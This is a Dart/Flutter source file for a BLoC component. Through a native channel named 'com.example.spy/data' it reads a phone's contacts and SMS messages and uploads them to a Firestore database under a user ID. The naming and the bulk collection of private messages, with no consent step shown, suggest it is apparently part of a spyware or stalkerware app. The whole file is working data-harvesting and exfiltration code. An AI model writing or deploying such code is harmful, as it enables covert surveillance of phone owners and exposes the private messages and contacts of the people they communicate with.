import 'dart:async';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'contact_sms_event.dart';
import 'contact_sms_state.dart';
import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:flutter/services.dart';

class ContactSmsBloc extends Bloc<ContactSmsEvent, ContactSmsState> {
  ContactSmsBloc() : super(ContactSmsInitial()) {
    on<LoadContactAndSms>(_onLoadData);
    on<UploadContactAndSms>(_onUploadData);
  }

  Future<void> _onLoadData(LoadContactAndSms event, Emitter emit) async {
    emit(ContactSmsLoading());
    try {
      const platform = MethodChannel("com.example.spy/data");
      final result = await platform.invokeMethod<Map>("getContactsAndSms");

      if (result != null) {
        final contacts = List<Map<String, dynamic>>.from(result["contacts"]);
        final smsList = List<Map<String, dynamic>>.from(result["sms"]);

        add(
          UploadContactAndSms(
            contacts: contacts,
            smsList: smsList,
            uid: event.uid,
          ),
        );
      } else {
        emit(ContactSmsError("Failed to get data"));
      }
    } catch (e) {
      emit(ContactSmsError(e.toString()));
    }
  }

  Future<void> _onUploadData(UploadContactAndSms event, Emitter emit) async {
    try {
      final userRef = FirebaseFirestore.instance
          .collection('users')
          .doc(event.uid);

      for (var contact in event.contacts) {
        await userRef.collection('contacts').doc(contact['phone']).set(contact);
      }

      final smsRef = userRef.collection('sms');
      final existingSms = await smsRef.get();

      final existingTimestamps = existingSms.docs
          .map((doc) => doc['timestamp'].toString())
          .toSet();

      for (var sms in event.smsList) {
        if (!existingTimestamps.contains(sms['timestamp'].toString())) {
          await smsRef.add(sms);
        }
      }

      emit(ContactSmsUploaded());
    } catch (e) {
      emit(ContactSmsError(e.toString()));
    }
  }
}
